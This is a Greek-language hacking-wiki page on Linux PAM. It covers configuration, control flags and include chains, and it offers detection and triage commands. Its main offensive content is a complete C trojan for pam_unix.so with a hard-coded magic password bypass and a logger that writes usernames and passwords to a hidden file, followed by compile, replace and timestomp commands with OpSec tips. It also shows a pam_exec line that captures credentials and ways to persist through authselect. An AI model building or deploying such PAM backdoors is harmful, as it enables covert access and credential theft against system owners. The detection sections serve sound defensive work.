# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Βασικές πληροφορίες

Το **PAM (Pluggable Authentication Modules)** λειτουργεί ως μηχανισμός ασφαλείας που **επαληθεύει την ταυτότητα των χρηστών που επιχειρούν να αποκτήσουν πρόσβαση σε υπηρεσίες υπολογιστή**, ελέγχοντας την πρόσβασή τους με βάση διάφορα κριτήρια. Είναι σαν ένας ψηφιακός φύλακας, που διασφαλίζει ότι μόνο εξουσιοδοτημένοι χρήστες μπορούν να χρησιμοποιούν συγκεκριμένες υπηρεσίες, ενώ ενδέχεται να περιορίζει τη χρήση τους για να αποτρέψει την υπερφόρτωση του συστήματος.

#### Αρχεία διαμόρφωσης

- Το **Solaris** υποστηρίζει το παλαιότερο κεντρικό αρχείο `/etc/pam.conf`, αλλά οι τρέχουσες οδηγίες προτιμούν αρχεία υπηρεσιών στον κατάλογο `/etc/pam.d`.<sup>[[10]](#references)</sup>
- Τα **συστήματα Linux** προτιμούν την προσέγγιση των καταλόγων, αποθηκεύοντας διαμορφώσεις ειδικές για κάθε υπηρεσία μέσα στο `/etc/pam.d`. Για παράδειγμα, το αρχείο διαμόρφωσης της υπηρεσίας login βρίσκεται στο `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Ένα παράδειγμα διαμόρφωσης PAM για την υπηρεσία login θα μπορούσε να είναι το εξής:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **Τομείς διαχείρισης PAM**

Αυτοί οι τομείς, ή ομάδες διαχείρισης, περιλαμβάνουν τα **auth**, **account**, **password** και **session**, καθένα από τα οποία είναι υπεύθυνο για διαφορετικές πτυχές της διαδικασίας ελέγχου ταυτότητας και διαχείρισης συνεδριών:<sup>[[1]](#references)</sup>

- **Auth**: Επαληθεύει την ταυτότητα του χρήστη, συνήθως ζητώντας κωδικό πρόσβασης.
- **Account**: Διαχειρίζεται την επαλήθευση λογαριασμού, ελέγχοντας συνθήκες όπως η συμμετοχή σε ομάδα ή οι χρονικοί περιορισμοί.
- **Password**: Διαχειρίζεται τις ενημερώσεις κωδικών πρόσβασης, συμπεριλαμβανομένων των ελέγχων πολυπλοκότητας και της αποτροπής επιθέσεων με λεξικό.
- **Session**: Διαχειρίζεται ενέργειες κατά την έναρξη ή τη λήξη μιας συνεδρίας υπηρεσίας, όπως η προσάρτηση καταλόγων ή ο ορισμός ορίων πόρων.

#### **Έλεγχοι μονάδων PAM**

Οι έλεγχοι καθορίζουν την απόκριση της μονάδας σε περίπτωση επιτυχίας ή αποτυχίας, επηρεάζοντας τη συνολική διαδικασία ελέγχου ταυτότητας. Περιλαμβάνουν τα εξής:<sup>[[1]](#references)</sup>

- **Required**: Η αποτυχία μιας απαιτούμενης μονάδας οδηγεί τελικά σε αποτυχία, αλλά μόνο αφού ελεγχθούν όλες οι επόμενες μονάδες.
- **Requisite**: Άμεσος τερματισμός της διαδικασίας σε περίπτωση αποτυχίας.
- **Sufficient**: Αν δεν έχει αποτύχει νωρίτερα κάποια μονάδα `required`, η επιτυχία επιστρέφεται αμέσως και παραλείπονται οι υπόλοιπες μονάδες της ίδιας ομάδας διαχείρισης.
- **Optional**: Προκαλεί αποτυχία μόνο αν είναι η μοναδική μονάδα στη στοίβα.

#### Επιθετικές σημασιολογικές λεπτομέρειες που έχουν σημασία

Κατά την ανάλυση ή την τροποποίηση του PAM, η **θέση ενός κανόνα που εισάγεται** καθορίζει ποια στοίβα τον εφαρμόζει:<sup>[[1]](#references)[[13]](#references)</sup>

- Τα `include` και `substack` εισάγουν κανόνες από άλλα αρχεία, επομένως η επεξεργασία του `sshd` μπορεί να επηρεάσει μόνο το SSH, ενώ η επεξεργασία των `system-auth`, `common-auth` ή μιας άλλης κοινόχρηστης στοίβας μπορεί να επηρεάσει ταυτόχρονα πολλές υπηρεσίες.<sup>[[1]](#references)[[13]](#references)</sup>
- Το PAM υποστηρίζει επίσης ελέγχους σε αγκύλες, όπως `[success=1 default=ignore]`. Αυτοί μπορούν να χρησιμοποιηθούν καταχρηστικά για την **παράλειψη μίας ή περισσότερων μονάδων** μετά από έναν επιτυχημένο προσαρμοσμένο έλεγχο, αντί για την εμφανή αντικατάσταση του `pam_unix.so`.<sup>[[1]](#references)</sup>
- Το `module-path` μπορεί να είναι **απόλυτο** (`/usr/lib/security/pam_custom.so`) ή **σχετικό** με τον προεπιλεγμένο κατάλογο μονάδων PAM. Σε σύγχρονα συστήματα Linux, οι πραγματικοί κατάλογοι είναι συχνά οι `/lib/security`, `/lib64/security`, `/usr/lib/security` ή διαδρομές multiarch, όπως η `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Σύντομη πρακτική συμβουλή: χαρτογραφείτε πάντα το **πλήρες γράφημα υπηρεσιών** πριν από οποιαδήποτε τροποποίηση. Για παράδειγμα, οι αλυσίδες `sshd -> password-auth -> system-auth` σε ορισμένες διανομές ή `sshd -> system-remote-login -> system-login -> system-auth` σε άλλες σημαίνουν ότι το ίδιο implant μίας γραμμής μπορεί να επηρεάσει πολύ περισσότερα από όσα προβλεπόταν.<sup>[[1]](#references)[[13]](#references)</sup>

Μια προσαρμοσμένη μονάδα `auth` μπορεί να προσθέσει μια διαδραστική πρόκληση στο `sudo` μετά τον κωδικό πρόσβασης του λογαριασμού. Ελέγξτε την ενεργή στοίβα `/etc/pam.d/sudo`, την πολιτική που περιλαμβάνεται, τα ορίσματα της μονάδας και τα δικαιώματα σε κάθε σχετικό τοπικό αρχείο δεδομένων, πριν εξετάσετε χειροκίνητα την πρόκληση. Μια αναγνώσιμη λίστα λέξεων για την πρόκληση από μόνη της δεν παρακάμπτει τον έλεγχο κωδικού πρόσβασης ούτε δημιουργεί δικαίωμα sudoers. Για μια μετάβαση με αυξημένα προνόμια εξακολουθούν να απαιτούνται ο σωστός έλεγχος ταυτότητας λογαριασμού, η ολοκλήρωση κάθε απαιτούμενου βήματος PAM και ένας κανόνας sudo που επιτρέπει την εκτέλεση ως root· η αυτοματοποιημένη απαρίθμηση δεν πρέπει να ενεργοποιεί την πρόκληση.

Για το παλιό ελάττωμα ιδιοκτησίας [`pam_motd` (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832) του Ubuntu, εξετάστε την πραγματική έκδοση του build του `libpam-modules` και αν κάποια υπηρεσία σύνδεσης καλεί την επηρεαζόμενη μονάδα session. Το Ubuntu το διόρθωσε στις εκδόσεις **1.1.0-2ubuntu1.1** για την 9.10 και **1.1.1-2ubuntu5** για την 10.04 LTS· για άλλες εκδόσεις ή backports από προμηθευτές απαιτείται ξεχωριστή αξιολόγηση πακέτου. Η αναφερόμενη διαδρομή επίθεσης απαιτούσε από τον καλούντα να αντικαταστήσει τον προσωπικό του κατάλογο `.cache` με ένα symlink και έπειτα να προκαλέσει σύνδεση PAM, με αποτέλεσμα η παλιά μονάδα να αλλάξει την ιδιοκτησία ενός προστατευμένου στόχου. Μια καταχώριση `.cache`, μια γραμμή `pam_motd.so` ή μια παλιά έκδοση πυρήνα από μόνη της δεν αποδεικνύει ότι υπάρχει έκθεση· ελέγξτε τον έλεγχο του προσωπικού καταλόγου, την ενεργή έκδοση της μονάδας, τη δυνατότητα σύνδεσης, τον χειρισμό symlink και τα δικαιώματα του στόχου, χωρίς να αντικαταστήσετε αρχεία ή να ξεκινήσετε σύνδεση κατά την παθητική απαρίθμηση. Δείτε την [ενημέρωση ασφαλείας του Ubuntu](https://ubuntu.com/security/notices/USN-959-1).

#### Παράδειγμα σεναρίου

Σε μια ρύθμιση με πολλές μονάδες auth, η διαδικασία ακολουθεί αυστηρή σειρά. Αν η μονάδα `pam_securetty` διαπιστώσει ότι το τερματικό σύνδεσης δεν είναι εξουσιοδοτημένο, οι συνδέσεις root αποκλείονται, αλλά όλες οι μονάδες εξακολουθούν να εκτελούνται λόγω της κατάστασής της ως "required". Η `pam_env` ορίζει μεταβλητές περιβάλλοντος, κάτι που ενδέχεται να βελτιώσει την εμπειρία χρήστη. Οι μονάδες `pam_ldap` και `pam_unix` συνεργάζονται για τον έλεγχο ταυτότητας του χρήστη, με την `pam_unix` να επιχειρεί να χρησιμοποιήσει έναν κωδικό πρόσβασης που έχει δοθεί προηγουμένως, ενισχύοντας την αποδοτικότητα και την ευελιξία των μεθόδων ελέγχου ταυτότητας.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Το `pam_permit` σε μια στοίβα υπηρεσίας

Το `pam_permit.so` επιστρέφει επιτυχία στους ελέγχους PAM. Αν ένας χρήστης με χαμηλότερα προνόμια μπορεί να τροποποιήσει την ενεργή πολιτική PAM μιας υπηρεσίας, η εισαγωγή του με μια σημαία ελέγχου που παρακάμπτει το υπόλοιπο stack ελέγχου ταυτότητας μπορεί να αφαιρέσει τον έλεγχο κωδικού πρόσβασης για αυτή την υπηρεσία. Για το `sudo`, εξετάστε το `/etc/pam.d/sudo` και κάθε αρχείο `common-auth` ή `system-auth` που περιλαμβάνεται, προτού αποφασίσετε ποιες υπηρεσίες επηρεάζονται. Η παράκαμψη ελέγχου ταυτότητας PAM **δεν** δημιουργεί νέο κανόνα sudoers· ο χρήστης πρέπει και πάλι να έχει εξουσιοδότηση για την εκτέλεση της ζητούμενης εντολής. Ελέγξτε τη σειρά των κανόνων και τυχόν προηγούμενες αποτυχίες `required`, αντί να υποθέσετε ότι μια μεμονωμένη γραμμή `sufficient pam_permit.so` επιτυγχάνει πάντα.

## Τοποθέτηση backdoor στο PAM – Hooking του `pam_unix.so`

Ένα κλασικό τέχνασμα persistence σε περιβάλλοντα Linux υψηλής αξίας είναι η **αντικατάσταση της νόμιμης βιβλιοθήκης PAM με ένα trojanised drop-in**. Σε έναν host του οποίου η στοίβα PAM φορτώνει το `pam_unix.so`, ο έλεγχος ταυτότητας μέσω SSH ή κονσόλας μπορεί να καλέσει το entry point `pam_sm_authenticate()`· μια κακόβουλη αντικατάσταση μπορεί να υποκλέψει διαπιστευτήρια ή να υλοποιήσει παράκαμψη με *μαγικό* κωδικό πρόσβασης.<sup>[[2]](#references)[[11]](#references)</sup>

### Συνοπτικός οδηγός μεταγλώττισης
Το παρακάτω παράδειγμα χρησιμοποιεί το service entry point `pam_sm_authenticate()` του Linux-PAM και το `pam_get_authtok()` για πρόσβαση στο token ελέγχου ταυτότητας.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Δείγμα trojan για το `pam_unix.so`</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Κάντε compile και stealth-replace (το μοτίβο αντικατάστασης/timestomp τεκμηριώνεται από την Unit 42). Προσαρμόστε τόσο τη διαδρομή του αντιγράφου ασφαλείας που είναι hard-coded στο wrapper όσο και τις παρακάτω εντολές στον πραγματικό κατάλογο των PAM modules του στόχου:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### Συμβουλές OpSec
1. **Ατομική αντικατάσταση** – γράψτε μια πλήρη βιβλιοθήκη σε προσωρινό αρχείο και μετονομάστε το ώστε να αντικαταστήσει το αρχικό, για να αποφύγετε να μείνει ένα μερικώς γραμμένο authentication module.
2. Μια διαδρομή όπως `/usr/bin/.dbus.log` εντοπίστηκε στην ανάλυση AuthDoor της Unit 42, επομένως αποτελεί επίσης χρήσιμο δείκτη για threat hunting.<sup>[[2]](#references)</sup>
3. Διατηρήστε τα entry points που αναμένει το PAM stack (για παράδειγμα, τα `pam_sm_authenticate` και `pam_sm_setcred`), ώστε οι υπόλοιπες λειτουργίες διαχείρισης να συνεχίσουν να λειτουργούν.<sup>[[11]](#references)[[18]](#references)</sup>

### Ανίχνευση
Για ελέγχους ακεραιότητας πακέτων, το RPM επαληθεύει τα μεταδεδομένα των εγκατεστημένων αρχείων, το `debsums -s` αναφέρει σφάλματα checksum και το `dpkg -S` στο block triage αναζητά την ιδιοκτησία πακέτων· η σύνταξη audit watch καταγράφει εγγραφές και αλλαγές χαρακτηριστικών σε μια διαδρομή.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Συγκρίνετε το MD5/SHA256 του `pam_unix.so` με εκείνο του πακέτου της διανομής.
* Χρησιμοποιήστε `rpm -V pam` ή `debsums -s libpam-modules` για να εντοπίσετε αντικαταστημένες βιβλιοθήκες χωρίς χειροκίνητο υπολογισμό hash.
* Ελέγξτε για αρχεία εγγράψιμα από όλους ή ασυνήθιστη ιδιοκτησία κάτω από το `/lib/security/`.
* Κανόνας `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Αναζητήστε στις ρυθμίσεις PAM απροσδόκητα modules: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Αυτή η αναζήτηση `pam_` δεν εντοπίζει προσαρμοσμένα modules με διαφορετικά ονόματα `.so`. Ελέγξτε τις **ενεργές** γραμμές `auth`, `account`, `password` και `session` στο `/etc/pam.d` (και στο `/etc/pam.conf`, όπου χρησιμοποιείται), μαζί με το control flag τους και τυχόν συμπεριλαμβανόμενα stacks. Ένα άγνωστο module τοποθετημένο ως `auth sufficient` πριν από τον κανονικό έλεγχο κωδικού πρόσβασης αξίζει έλεγχο ιδιοκτησίας πακέτου και δυαδικού αρχείου· [η σύνταξη ελέγχου του PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html) μπορεί να επιτρέψει στην επιτυχία να τερματίσει νωρίς αυτό το μέρος του stack. Ένα όνομα module, μια ασυνήθιστη χρονική σήμανση ή η επιλογή `nodelay` από μόνα τους δεν αποδεικνύουν παράκαμψη. Αν η συμπεριφορά υποδηλώνει timing leak, ελέγξτε πρώτα την υλοποίηση και την προσβασιμότητα της υπηρεσίας· η συνηθισμένη απαρίθμηση δεν πρέπει να υποβάλλει επανειλημμένα δοκιμαστικές προσπάθειες authentication.

### Γρήγορες εντολές triage (μετά από παραβίαση ή για threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Κατάχρηση του `pam_exec` για persistence
Αντί να αντικαταστήσετε το `pam_unix.so`, μια λιγότερο παρεμβατική προσέγγιση είναι να προσθέσετε μια γραμμή `pam_exec` στο `/etc/pam.d/sshd`, ώστε μια κλήση που φτάνει σε αυτήν τη γραμμή PAM να εκτελεί ένα βοηθητικό πρόγραμμα, διατηρώντας ανέπαφη την κανονική στοίβα.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
Το `pam_exec` λαμβάνει μεταδεδομένα PAM σε μεταβλητές περιβάλλοντος όπως `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` και `PAM_TYPE`. Με το `expose_authtok`, το helper μπορεί να διαβάσει έως και `PAM_MAX_RESP_SIZE` bytes του password από το `stdin` κατά τις φάσεις `auth` ή `password`. Αν θέλετε το helper να εκτελείται με το effective UID αντί για το real UID, προσθέστε το `seteuid`.<sup>[[4]](#references)</sup>

Οι πρακτικές σημειώσεις που ακολουθούν αφορούν τους τύπους module και το φίλτρο `type=` που τεκμηριώνονται για το `pam_exec`:<sup>[[4]](#references)</sup>

- Το `session optional pam_exec.so ...` είναι προτιμότερο για **ενέργειες μετά τη σύνδεση**, όπως το εκ νέου άνοιγμα sockets ή η εκκίνηση ενός detached daemon.
- Το `auth optional pam_exec.so quiet expose_authtok ...` είναι η συνήθης επιλογή για **υποκλοπή διαπιστευτηρίων**, επειδή εκτελείται πριν ανοίξει η session.
- Τα `type=session` ή `type=auth` μπορούν να χρησιμοποιηθούν για να περιοριστεί η εκτέλεση σε συγκεκριμένη φάση PAM και να αποφευχθεί η άσκοπη διπλή εκτέλεση.

Κατά τον έλεγχο προνομίων, μια απόλυτη διαδρομή helper για `pam_exec.so` στην οποία μπορεί να γράψει ο τρέχων χρήστης είναι υποψήφια, ακόμη κι όταν το αρχείο έχει επισημανθεί ως append-only (`a`): [το attribute επιτρέπει την προσθήκη περιεχομένου](https://man7.org/linux/man-pages/man1/chattr.1.html), κάτι που μπορεί να αρκεί για να αλλάξει η μετέπειτα συμπεριφορά ενός shell script. Επιβεβαιώστε πρώτα ότι η υπηρεσία PAM και το σχετικό συμβάν φτάνουν πράγματι σε αυτή τη γραμμή, ότι το helper και η γονική διαδρομή του είναι έμπιστα και ότι η εντολή εκτελείται με πιο προνομιούχα ταυτότητα· το [`seteuid` αλλάζει ποιο UID PAM χρησιμοποιείται](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Ένα εγγράψιμο αρχείο ή ένα αποτέλεσμα `lsattr` από μόνο του δεν αποδεικνύει εκτέλεση με προνόμια.

### Επιβίωση από τα εργαλεία διανομής: `authselect`

Σε συστήματα της οικογένειας RHEL και Fedora που χρησιμοποιούν `authselect`, οι άμεσες αλλαγές σε αρχεία που δημιουργούνται αυτόματα, όπως τα `/etc/pam.d/system-auth` ή `/etc/pam.d/password-auth`, μπορεί να **αντικατασταθούν από το `authselect`**. Για persistence, οι operators συχνά τροποποιούν το ενεργό custom profile κάτω από το `/etc/authselect/custom/<profile>/` και στη συνέχεια το επιλέγουν ξανά.<sup>[[5]](#references)[[19]](#references)</sup>

Συνήθης διαδικασία όταν έχετε root:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Αυτό είναι σημαντικό τόσο για τις επιθετικές ενέργειες όσο και για το triage: αν το `/etc/pam.d/system-auth` περιέχει το banner `Generated by authselect` και το `Do not modify this file manually`, τότε το πραγματικό σημείο persistence μπορεί να βρίσκεται στο `/etc/authselect/custom/` και όχι στο `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Πρόσφατες πρακτικές που έχουν εντοπιστεί στην πράξη

Πρόσφατες αναφορές του 2025 για το Linux backdoor **Plague** έδειξαν την ίδια βασική ιδέα σε πιο εξελιγμένη μορφή: ένα κακόβουλο στοιχείο PAM με **στατικό κωδικό παράκαμψης**, σε συνδυασμό με εκκαθάριση μεταβλητών περιβάλλοντος που σχετίζονται με το SSH και του ιστορικού του shell (`HISTFILE=/dev/null`), ώστε να μειώνονται τα ίχνη της συνεδρίας μετά τη σύνδεση.<sup>[[3]](#references)</sup> Αυτό αποτελεί χρήσιμο μοτίβο για hunting, επειδή η λογική του backdoor μπορεί να βρίσκεται στο PAM, ενώ τα ίχνη απόκρυψης εμφανίζονται μόνο **μετά** την επιτυχή πιστοποίηση.


## References

- [1] [pam.conf(5) / pam.d(5) - Εγχειρίδιο Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Το εγχειρίδιο του μυστικού πράκτορα: Διείσδυση σε παγκόσμια τηλεπικοινωνιακά δίκτυα - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Ένα πρόσφατα ανακαλυφθέν backdoor για Linux βασισμένο στο PAM](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Εγχειρίδιο Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Ρύθμιση της πιστοποίησης χρηστών με χρήση του authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Σελίδες εγχειριδίου του Debian](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Σελίδες εγχειριδίου του Debian](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Διαχείριση πιστοποίησης στο Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Εγχειρίδιο Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Εγχειρίδιο Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Οδηγός πιστοποίησης σε επίπεδο συστήματος - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Λίστα αρχείων πακέτου Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Εγχειρίδιο Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Εγχειρίδιο Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Σελίδες εγχειριδίου του Debian](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Εγχειρίδιο Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Αλλαγές/Καθιέρωση του Authselect ως υποχρεωτικού - Wiki του Fedora Project](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
